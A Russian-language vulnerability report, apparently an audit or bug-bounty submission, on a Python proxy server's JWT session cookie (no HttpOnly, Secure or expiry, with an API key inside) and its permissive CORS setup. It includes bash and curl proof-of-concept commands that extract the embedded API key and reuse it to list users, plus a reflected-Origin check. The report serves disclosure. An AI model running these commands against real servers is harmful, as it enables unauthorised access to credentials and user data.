## F3 — Session Management (детали)

**Уязвимость:** `/v2/login` выдаёт JWT cookie с критическими проблемами:

```
set-cookie: token=eyJ...; Path=/; SameSite=lax
                          ↑ нет HttpOnly
                          ↑ нет Secure
```

JWT payload содержит:
```json
{
  "user_id": "...",
  "key": "sk-E8oNXXj...",   ← реальный API ключ
  "user_role": "proxy_admin",
  "exp": null               ← нет срока действия
}
```

Дополнительно:
- `/logout` → 404 (нет механизма выхода)
- Токен никогда не инвалидируется server-side

**Source:** `proxy_server.py:11120` — `set_cookie(key="token", value=jwt_token)` без `httponly=True`
**Source:** `proxy_server.py:11103` — `jwt.encode(...)` без `exp` claim

**PoC (проверен 2026-03-22):**
```bash
# 1. Получить JWT
JWT=$(curl -sv -X POST http://TARGET:4000/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "MASTER_KEY"}' 2>&1 \
  | grep "set-cookie: token=" | sed 's/.*token=//; s/;.*//')

# 2. Извлечь API ключ из JWT payload
API_KEY=$(echo $JWT | cut -d'.' -f2 | python3 -c "
import base64,json,sys
p = sys.stdin.read().strip() + '==='
print(json.loads(base64.b64decode(p))['key'])
")

# 3. Использовать ключ — он работает вечно
curl http://TARGET:4000/user/list -H "Authorization: Bearer $API_KEY"
# → 200 OK, полный список пользователей (proxy_admin)
```

## F4 — CORS Misconfiguration (детали)

**Source:** `proxy_server.py:1133`:
```python
origins = ["*"]
app.add_middleware(CORSMiddleware, allow_origins=origins, allow_credentials=True)
```

Starlette CORSMiddleware с `*` + `credentials=True` **отражает Origin** для credentialed preflight:

```bash
curl -X OPTIONS http://TARGET:4000/key/list \
  -H "Origin: https://evil.example.com" \
  -H "Access-Control-Request-Method: GET"
# → Access-Control-Allow-Origin: https://evil.example.com ← reflected!
# → Access-Control-Allow-Credentials: true
```

Частично смягчается `SameSite=lax` на cookie, но в комбинации с F3 (нет HttpOnly) — потенциальный CSRF при наличии XSS.

**Примечание:** ATG brain запатчил это в установленной версии (proxy_server.py:1459), но finding отправлен по оригинальному коду — валиден.
